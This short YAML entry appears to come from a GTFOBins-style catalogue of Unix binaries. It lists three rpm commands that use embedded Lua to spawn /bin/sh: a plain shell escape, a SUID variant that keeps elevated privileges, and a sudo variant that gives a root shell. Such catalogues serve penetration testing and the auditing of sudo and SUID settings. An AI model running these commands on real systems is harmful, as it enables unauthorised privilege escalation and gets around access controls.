---
functions:
  execute-interactive:
    - code: rpm --eval '%{lua:posix.exec("/bin/sh")}'
  suid-enabled:
    - code: ./rpm --eval '%{lua:posix.exec("/bin/sh", "-p")}'
  sudo-enabled:
    - code: sudo rpm --eval '%{lua:posix.exec("/bin/sh")}'
---
